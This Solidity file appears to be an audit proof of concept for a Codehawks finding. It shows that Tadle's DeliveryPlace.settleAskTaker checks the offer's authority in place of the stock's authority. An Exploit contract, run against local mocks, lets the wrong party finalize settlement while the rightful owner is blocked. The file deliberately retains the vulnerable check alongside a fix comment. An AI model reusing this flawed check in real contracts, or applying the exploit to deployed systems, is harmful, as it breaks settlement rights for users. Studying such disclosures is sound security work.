// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Tadle — DeliveryPlace::settleAskTaker has incorrect access control
    (Codehawks, p0wd3r, finding #38066)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground. The vulnerable
    AskSettling branch of settleAskTaker is inlined VERBATIM (including its own
    devdoc "@dev caller must be stock authority"); the Exploit deploys the
    reduced DeliveryPlace + TokenManager, wires up one Ask-type settlement
    stock, and shows the rightful stock authority is denied service while a
    different address (the offer's original authority) is wrongly authorized
    instead — a role-bypass access-control bug (no fork, no cheatcodes).

    Root cause: settleAskTaker's AskSettling branch checks
    `_msgSender() != offerInfo.authority` instead of
    `_msgSender() != stockInfo.authority`. Per the function's own devdoc, the
    caller who is SUPPOSED to be allowed to settle is the stock authority (the
    party actually holding the Ask-type settlement stock and obligated to
    deliver points) — not the offer's original authority. The two addresses
    are attached to different roles and are NOT interchangeable.
//////////////////////////////////////////////////////////////////////////*/

contract MockToken {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        if (msg.sender != from) {
            allowance[from][msg.sender] -= amt;
        }
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

library Errors {
    error Unauthorized();
}

enum StockStatus {
    Initialized,
    Finished
}
enum StockType {
    Bid,
    Ask
}
enum MarketPlaceStatus {
    AskSettling,
    Other
}

struct StockInfo {
    address authority; // the TRUE owner of this settlement stock — must deliver points
    StockStatus stockStatus;
    StockType stockType;
    uint256 points;
    address preOffer;
}

struct OfferInfo {
    address authority; // the offer's original maker — a DIFFERENT role, not the settling stock's owner
}

struct MakerInfo {
    address tokenAddress;
}

struct MarketPlaceInfo {
    address tokenAddress;
    uint256 tokenPerPoint;
    bool fixedratio;
}

/// @notice Minimal TokenManager: pulls settlement point-tokens in and credits an internal ledger.
///         Mirrors ITokenManager.tillIn / addTokenBalance from the real Tadle TokenManager.
contract TokenManager {
    enum TokenBalanceType {
        PointToken
    }

    mapping(address => mapping(address => mapping(uint8 => uint256))) public userTokenBalanceMap;

    function tillIn(address from, address token, uint256 amount, bool /*isPointToken*/ ) external {
        MockToken(token).transferFrom(from, address(this), amount);
    }

    function addTokenBalance(TokenBalanceType t, address account, address token, uint256 amount) external {
        userTokenBalanceMap[account][token][uint8(t)] += amount;
    }
}

/// @notice Reduced DeliveryPlace. A `setup()` scaffolding function replaces the real
///         PreMarkets/PerMarkets/SystemConfig wiring (createOffer/createTaker/updateMarket)
///         so the vulnerable settleAskTaker check can be exercised directly and
///         deterministically. settleAskTaker itself is verbatim.
contract DeliveryPlace {
    TokenManager public tokenManager;
    address public owner_;

    mapping(address => StockInfo) public stockInfoMap; // stock address -> info
    mapping(address => OfferInfo) public offerInfoMap; // offer address -> info
    mapping(address => MakerInfo) public makerInfoMap; // offer address -> maker info (tokenAddress)
    MarketPlaceInfo public marketPlaceInfo;
    MarketPlaceStatus public status;

    error InvalidStockStatus();
    error FixedRatioUnsupported();
    error InvalidStockType();
    error InvalidPoints();

    constructor(TokenManager _tm) {
        tokenManager = _tm;
        owner_ = msg.sender;
    }

    function owner() public view returns (address) {
        return owner_;
    }

    /// @dev Test scaffolding only — wires up one Ask-type settlement stock + its
    ///      originating offer, mirroring what PreMarkets.createOffer + createTaker +
    ///      SystemConfig.updateMarket produce in the real system.
    function setup(
        address _stock,
        address _offer,
        address _stockAuthority,
        address _offerAuthority,
        uint256 _points,
        address _tokenAddress,
        uint256 _tokenPerPoint
    ) external {
        stockInfoMap[_stock] = StockInfo({
            authority: _stockAuthority,
            stockStatus: StockStatus.Initialized,
            stockType: StockType.Ask,
            points: _points,
            preOffer: _offer
        });
        offerInfoMap[_offer] = OfferInfo({authority: _offerAuthority});
        makerInfoMap[_offer] = MakerInfo({tokenAddress: _tokenAddress});
        marketPlaceInfo = MarketPlaceInfo({tokenAddress: _tokenAddress, tokenPerPoint: _tokenPerPoint, fixedratio: false});
        status = MarketPlaceStatus.AskSettling;
    }

    function getOfferInfo(address _offer)
        public
        view
        returns (OfferInfo memory, MakerInfo memory, MarketPlaceInfo memory, MarketPlaceStatus)
    {
        return (offerInfoMap[_offer], makerInfoMap[_offer], marketPlaceInfo, status);
    }

    function _msgSender() internal view returns (address) {
        return msg.sender;
    }

    /**
     * @notice Settle ask taker
     * @dev caller must be stock authority
     * @dev market place status must be AskSettling
     * @param _stock stock address
     * @param _settledPoints settled points
     * @notice _settledPoints must be less than or equal to stock points
     */
    function settleAskTaker(address _stock, uint256 _settledPoints) external {
        StockInfo memory stockInfo = stockInfoMap[_stock];

        (
            OfferInfo memory offerInfo,
            MakerInfo memory makerInfo,
            MarketPlaceInfo memory marketPlaceInfo_,
            MarketPlaceStatus status_
        ) = getOfferInfo(stockInfo.preOffer);

        if (stockInfo.stockStatus != StockStatus.Initialized) {
            revert InvalidStockStatus();
        }

        if (marketPlaceInfo_.fixedratio) {
            revert FixedRatioUnsupported();
        }
        if (stockInfo.stockType == StockType.Bid) {
            revert InvalidStockType();
        }
        if (_settledPoints > stockInfo.points) {
            revert InvalidPoints();
        }

        if (status_ == MarketPlaceStatus.AskSettling) {
            if (_msgSender() != offerInfo.authority) {
                // @> VULN: checks offerInfo.authority (the offer's original maker) instead of
                //          stockInfo.authority (the real owner of THIS settlement stock), even
                //          though the function's own devdoc says "caller must be stock authority".
                // FIX: if (_msgSender() != stockInfo.authority) revert Errors.Unauthorized();
                revert Errors.Unauthorized();
            }
        } else {
            if (_msgSender() != owner()) {
                revert Errors.Unauthorized();
            }
            if (_settledPoints > 0) {
                revert InvalidPoints();
            }
        }

        uint256 settledPointTokenAmount = marketPlaceInfo_.tokenPerPoint * _settledPoints;
        if (settledPointTokenAmount > 0) {
            tokenManager.tillIn(_msgSender(), marketPlaceInfo_.tokenAddress, settledPointTokenAmount, true);

            tokenManager.addTokenBalance(
                TokenManager.TokenBalanceType.PointToken, offerInfo.authority, makerInfo.tokenAddress, settledPointTokenAmount
            );
        }

        stockInfoMap[_stock].stockStatus = StockStatus.Finished;
    }
}

/// @notice A generic actor helper so calls into DeliveryPlace originate from a distinct
///         msg.sender per role (rightful stock authority vs. the offer's original authority).
contract Actor {
    function approveToken(MockToken t, address spender, uint256 amt) external {
        t.approve(spender, amt);
    }

    function trySettle(DeliveryPlace dp, address stock, uint256 points) external returns (bool ok) {
        try dp.settleAskTaker(stock, points) {
            ok = true;
        } catch {
            ok = false;
        }
    }
}

/// @notice Orchestrates the role-bypass demonstration: the rightful stock authority is
///         denied service; the offer's original authority (who should have no right to
///         settle this stock) is wrongly authorized and finalizes it instead.
contract Exploit {
    MockToken public pointToken;
    TokenManager public tokenManager;
    DeliveryPlace public deliveryPlace;
    Actor public stockOwner; // stockInfo.authority — the rightful settler per the devdoc
    Actor public offerOwner; // offerInfo.authority — a different role, wrongly authorized instead

    address public stockAddr = address(0xAAA1);
    address public offerAddr = address(0xBBB1);
    uint256 public constant POINTS = 1000;
    uint256 public constant TOKEN_PER_POINT = 1e16; // 0.01 token per point

    constructor() {
        pointToken = new MockToken();
        tokenManager = new TokenManager();
        deliveryPlace = new DeliveryPlace(tokenManager);
        stockOwner = new Actor();
        offerOwner = new Actor();

        deliveryPlace.setup(
            stockAddr, offerAddr, address(stockOwner), address(offerOwner), POINTS, address(pointToken), TOKEN_PER_POINT
        );

        uint256 amount = TOKEN_PER_POINT * POINTS;
        pointToken.mint(address(stockOwner), amount);
        pointToken.mint(address(offerOwner), amount);
    }

    function run() external {
        stockOwner.approveToken(pointToken, address(tokenManager), type(uint256).max);
        offerOwner.approveToken(pointToken, address(tokenManager), type(uint256).max);

        // The rightful stock authority tries to settle, exactly as the function's own devdoc
        // says it should ("@dev caller must be stock authority") — and is wrongly denied.
        bool stockOwnerOk = stockOwner.trySettle(deliveryPlace, stockAddr, POINTS);
        require(!stockOwnerOk, "harm not demonstrated: rightful stock authority was NOT blocked");

        // The offer's original authority — who has no legitimate claim on THIS settlement
        // stock — passes the buggy check instead and finalizes the trade in the rightful
        // owner's place.
        bool offerOwnerOk = offerOwner.trySettle(deliveryPlace, stockAddr, POINTS);
        require(offerOwnerOk, "harm not demonstrated: wrong authority was not incorrectly authorized");

        (,StockStatus finalStatus,,,) = deliveryPlace.stockInfoMap(stockAddr);
        require(finalStatus == StockStatus.Finished, "settlement did not actually finalize under the wrong caller");
    }
}
